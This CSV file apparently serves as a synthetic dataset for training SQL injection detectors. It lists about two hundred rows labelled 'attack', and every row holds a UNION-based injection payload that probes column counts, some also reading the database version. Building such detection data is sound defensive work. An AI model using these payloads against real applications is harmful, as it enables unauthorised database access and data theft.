id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_001474,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,6.548475754900849
CTGAN_001475,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000022,6.291465787665918
CTGAN_001476,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000057,6.9830634952767845
CTGAN_001477,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000062,7.566053875851631
CTGAN_001478,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000049,7.108715035501382
CTGAN_001479,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000061,6.988431946464598
CTGAN_001480,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000069,5.887767331738769
CTGAN_001481,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000027,8.189270489759298
CTGAN_001482,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,5.7831725486422565
CTGAN_001483,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,6.699759521675774
CTGAN_001484,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000019,7.774755832937384
CTGAN_001485,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000018,5.846380984999074
CTGAN_001486,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,5.035261894718557
CTGAN_001487,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,5.525809501269432
CTGAN_001488,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,6.077279449121423
CTGAN_001489,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,6.714150527448021
CTGAN_001490,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000043,9.038887029518298
CTGAN_001491,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,6.446143050110608
CTGAN_001492,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,8.30311741390863
CTGAN_001493,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000041,4.521493420310509
CTGAN_001494,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000073,6.213841174649718
CTGAN_001495,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,9.106315747180018
CTGAN_001496,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000011,6.820306110888842
CTGAN_001497,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000022,6.09622047146629
CTGAN_001498,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,5.397226588856255
CTGAN_001499,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000004,7.326249371395279
CTGAN_001500,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000002,9.491319369018157
CTGAN_001501,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000068,5.158114625048853
CTGAN_001502,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.077297143553769
CTGAN_001503,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000075,8.882275620917534
CTGAN_001504,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000062,8.39255066932543
CTGAN_001505,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,7.165370262017858
CTGAN_001506,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000077,8.022817243236515
CTGAN_001507,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,6.529653830080198
CTGAN_001508,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000042,7.435508867124727
CTGAN_001509,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.474798042698292
CTGAN_001510,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000071,7.636534626368415
CTGAN_001511,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.3006168407785434
CTGAN_001512,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000043,5.915586356740093
CTGAN_001513,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000029,6.820567772637504
CTGAN_001514,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,8.953037100214548
CTGAN_001515,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000050,5.655723058252875
CTGAN_001516,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,6.139062284090596
CTGAN_001517,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,5.7361819507950855
CTGAN_001518,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000069,6.284916850059541
CTGAN_001519,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,4.7016923459867135
CTGAN_001520,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000062,7.512692841273152
CTGAN_001521,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000072,7.502595635242185
CTGAN_001522,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000072,5.020198795823836
CTGAN_001523,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000038,6.676727911599777
CTGAN_001524,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.137942061338784
CTGAN_001525,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,7.272999591304325
CTGAN_001526,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,7.255468505593507
CTGAN_001527,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000059,6.788004054654746
CTGAN_001528,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,6.39020724454619
CTGAN_001529,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,5.180135634441134
CTGAN_001530,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,8.695561944295935
CTGAN_001531,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,5.830446654505427
CTGAN_001532,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000024,6.164878776390513
CTGAN_001533,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000062,6.032230985995391
CTGAN_001534,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,6.6415244455853655
CTGAN_001535,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,5.653270502368121
CTGAN_001536,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000022,5.233562688212703
CTGAN_001537,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.396795553194218
CTGAN_001538,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000069,6.785694423569678
CTGAN_001539,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.6607189301305185
CTGAN_001540,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000028,9.008869896051689
CTGAN_001541,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000062,7.06152034946076
CTGAN_001542,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000062,5.227723161074395
CTGAN_001543,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,7.645504082687311
CTGAN_001544,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000049,8.167484667482325
CTGAN_001545,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,6.5992134139578855
CTGAN_001546,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,6.9210040027928965
CTGAN_001547,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.9585277256084055
CTGAN_001548,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,6.753869295274505
CTGAN_001549,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000021,6.43691906761599
CTGAN_001550,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,6.5538615929153
CTGAN_001551,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000018,7.3480431080057755
CTGAN_001552,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000017,5.782056402160614
CTGAN_001553,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000062,5.528506272973992
CTGAN_001554,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000060,7.2227238744477065
CTGAN_001555,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.247007424176071
CTGAN_001556,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000059,6.74842643196011
CTGAN_001557,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,6.175846352067436
CTGAN_001558,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000076,5.581893864741475
CTGAN_001559,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,6.531600988762967
CTGAN_001560,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,4.417692360162194
CTGAN_001561,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,5.4639428346784555
CTGAN_001562,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000073,6.929070935092599
CTGAN_001563,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,6.580096685310792
CTGAN_001564,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000065,4.999440287973552
CTGAN_001565,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,6.71909678686949
CTGAN_001566,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,5.3556417527003495
CTGAN_001567,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.487032803457852
CTGAN_001568,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,5.601114355535203
CTGAN_001569,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,5.5187169291949525
CTGAN_001570,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,5.930417013811291
CTGAN_001571,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,9.752017201116848
CTGAN_001572,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000014,6.440427181789652
CTGAN_001573,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000028,6.666656732635128
CTGAN_001574,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000019,7.380232186237861
CTGAN_001575,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000025,6.475578728460537
CTGAN_001576,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000021,7.740037118684828
CTGAN_001577,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000027,6.580107146874597
CTGAN_001578,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000019,4.978116041219794
CTGAN_001579,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.320367236944665
CTGAN_001580,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000065,6.94844473958543
CTGAN_001581,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,6.547697873393249
CTGAN_001582,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,7.9044552048888015
CTGAN_001583,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000050,8.734007083337646
CTGAN_001584,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000049,6.468338989094139
CTGAN_001585,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000062,5.6448750690209515
CTGAN_001586,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000041,5.645149402395819
CTGAN_001587,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,6.04963591348022
CTGAN_001588,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000048,5.662253033312061
CTGAN_001589,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,5.390760007236048
CTGAN_001590,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,7.891442041009777
CTGAN_001591,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,5.7773428227925
CTGAN_001592,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000073,6.750990051497702
CTGAN_001593,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000043,6.900257902959694
CTGAN_001594,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,6.695631728965858
CTGAN_001595,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.761848860064244
CTGAN_001596,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,8.382208863581903
CTGAN_001597,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,5.648177582279457
CTGAN_001598,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000028,6.0439673384171435
CTGAN_001599,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.975557097201577
CTGAN_001600,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,7.631591144011892
CTGAN_001601,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,8.770500528570713
CTGAN_001602,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,5.391698034201573
CTGAN_001603,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,5.4697199405569545
CTGAN_001604,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,7.20888808889558
CTGAN_001605,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,7.134038045434576
CTGAN_001606,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000062,5.468436077358327
CTGAN_001607,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000050,7.522968955285662
CTGAN_001608,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000071,7.863747783966273
CTGAN_001609,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,6.947576056992246
CTGAN_001610,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000073,5.132645488685662
CTGAN_001611,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,9.611705786550038
CTGAN_001612,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,5.525467923084529
CTGAN_001613,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,6.349827665094117
CTGAN_001614,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000018,6.271489733809683
CTGAN_001615,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000050,5.285607276009788
CTGAN_001616,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,6.392364163998806
CTGAN_001617,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,6.581862979113757
CTGAN_001618,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000021,6.794126561368864
CTGAN_001619,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.117801829109944
CTGAN_001620,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.622191022321682
CTGAN_001621,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000018,6.284448582747253
CTGAN_001622,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,6.603555490985152
CTGAN_001623,attack,union,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",nearest_attack_euclidean,R000074,6.845378980570068
CTGAN_001624,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,6.98918734576881
CTGAN_001625,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,4.213851255299355
CTGAN_001626,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000049,5.423094105594555
CTGAN_001627,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000029,5.874591470450046
CTGAN_001628,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,5.786118138074816
CTGAN_001629,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000054,6.1894442502759
CTGAN_001630,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000014,6.475049486097578
CTGAN_001631,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.089190913346019
CTGAN_001632,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000035,7.545680895880725
CTGAN_001633,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,7.915375096596837
CTGAN_001634,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000023,7.206544461690727
CTGAN_001635,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000077,7.831399484475018
CTGAN_001636,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,5.535963112962901
CTGAN_001637,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,5.929528549934006
CTGAN_001638,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000050,7.758566855308147
CTGAN_001639,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000052,6.9424196032242405
CTGAN_001640,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000049,6.06481349275312
CTGAN_001641,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000011,7.674993813126502
CTGAN_001642,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000015,9.494525874399775
CTGAN_001643,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,8.286652779649648
CTGAN_001644,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000062,7.51788866416198
CTGAN_001645,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,5.9300664857414
CTGAN_001646,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,8.295812686611518
CTGAN_001647,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000061,8.468431944130273
CTGAN_001648,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,5.3273820856527605
CTGAN_001649,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000014,7.072938204503491
CTGAN_001650,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000020,9.770404343971737
CTGAN_001651,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,4.969469844374426
CTGAN_001652,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000061,5.838464737260903
CTGAN_001653,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000057,6.874159486198473
CTGAN_001654,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,7.537587975942584
CTGAN_001655,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,7.548797098542658
CTGAN_001656,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000062,8.028523307730492
CTGAN_001657,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000019,5.917072263346394
CTGAN_001658,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.447767359457595
CTGAN_001659,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000003,9.665669037145461
CTGAN_001660,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,6.25964912523638
CTGAN_001661,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,6.931063854467045
CTGAN_001662,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,7.780272216293737
CTGAN_001663,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000010,12.394643197744218
CTGAN_001664,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,5.262494262905222
CTGAN_001665,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000049,11.03091943059508
CTGAN_001666,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,6.556808456075835
CTGAN_001667,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,7.351456203065445
CTGAN_001668,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,8.242392654044485
CTGAN_001669,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,6.832551993991923
CTGAN_001670,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000048,6.25544730631092
CTGAN_001671,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000070,5.683289607636324
CTGAN_001672,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000049,7.603659681863907
CTGAN_001673,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,6.556656314278397
CTGAN_001674,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,6.083969362257489
CTGAN_001675,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000049,6.434873648683382
CTGAN_001676,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,5.247970002314028
